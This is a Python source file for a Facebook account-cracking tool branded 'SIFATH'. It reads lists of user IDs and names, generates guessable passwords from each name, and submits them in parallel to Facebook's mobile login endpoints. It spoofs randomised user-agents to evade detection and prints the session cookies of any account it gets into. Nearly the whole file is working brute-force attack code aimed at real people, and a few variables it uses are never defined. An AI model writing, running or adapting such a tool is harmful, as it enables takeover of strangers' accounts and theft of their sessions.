import requests,bs4,json,os,sys,random,datetime,time,re
import string
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
ugen=[]
ugen2=[]
loop=0
ok = 0
cp = 0
id = []
id2 = []
uid = []
ses = requests.Session()
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
p = '\x1b[0;34m' # BIRU +
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'



def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
		
logo=(f"""{H}
███████ ██ ███████  █████  ████████ ██   ██ 
██      ██ ██      ██   ██    ██    ██   ██ 
███████ ██ █████   ███████    ██    ███████ 
     ██ ██ ██      ██   ██    ██    ██   ██ 
███████ ██ ██      ██   ██    ██    ██   ██ 
{B}------------------------------------{B}
[{H}+{B}] WONER : HX-SIFATH
[{H}+{B}] FACEBOOK : sa sifath
[{H}+{B}] WHATSAPP : +8801982745700
[{H}+{B}] TOOLS : TERGET
[{H}+{B}] VERSION  : 1.0.0""")
		
		
		
def _main_():
	os.system('clear')
	print(logo)
	print(42*'-')
	print(f'[{H}1{B}] FILE CLONE')
	print(f'[{H}2{B}] RANDOM CLONE')
	print(42*'-')
	option = input (f'[{H}+{B}] CHOSE :{H} ')
	if option  =='1':sifath()
	else:
		print(f'pleses select correctly')
		_main_()
		
def sifath():
	os.system('clear')
	print(logo)
	print(42*'-')
	print(f'[{H}+{B}] EXAMPLE : {p}/sdcard/sifath.txt{B}')
	xv = input(f'[{H}+{B}] FILE PATH :{H} ')
	try:x = open(xv).read().splitlines()
	except:
		print(f'{B}[{p}?{B}] FILE NOT FOUND');slp(2)
		sifath()
	for idx in x:
		id.append(idx)
	settings()
		
def settings():
	for xvx in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,xvx)
	else:
		for xvx in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,xvx)
			Sifath()	
			
def Sifath():
	os.system('clear')
	print(logo)
	print(42*'-')
	print(f'[{H}+{B}] TOTAL ID : '+str(len(id)))
	print(42*'-')
	tl = str(len(id))
	with tred(max_workers=30) as vsoulx:
		for sad in id2:
			ids,nmv = sad.split('|')[0],sad.split('|')[1].lower()
			pax = nmv.split(' ')[0]
			pwv = []
			if len(nmv)<6:
				if len(pax)<3:
					pass 
				else:
					pwv.append(pax+'123')
					pwv.append(pax+'1234')
					pwv.append(pax+'12345')
					pwv.append(pax+'123456')
					pwv.append(nmv)
					pwv.append(pax+'@123')
					pwv.append(pax+'@@')
					pwv.append(pax+'@@@')
					pwv.append(pax+'#@')
					pwv.append(pax+'@###')
					pwv.append(pax+'12')
					pwv.append(pax+'11')
			else:
				if len(pax)<3:
					pwv.append(nmv)
				else:
					pwv.append(pax+'123')
					pwv.append(pax+'1234')
					pwv.append(pax+'12345')
					pwv.append(pax+'123456')
					pwv.append(nmv)
					pwv.append(pax+'@123')
					pwv.append(pax+'@@')
					pwv.append(pax+'@@@')
					pwv.append(pax+'#@')
					pwv.append(pax+'@###')
					pwv.append(pax+'12')
					pwv.append(pax+'11')
					vsoulx.submit(crack,ids,pwv)
		
		
def crack(ids,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[CRACKING] [{H}{loop}{B}] [{H}{len(id)}{B}] [OK:{H}{ok}{B}] "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	for pw in pwv:
		try:
			#nip=random.choice(prox)
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r[{C}CP{B}] {P}{idf} | {pw}')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r[{H}OK{B}] {ids} | {pw}')
				print(f'{H}{kuki}')
				print(42*'-')
				#python sifat.py
				break
				
			else: 
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('touch Prox.txt')
	except:pass	
_main_()
		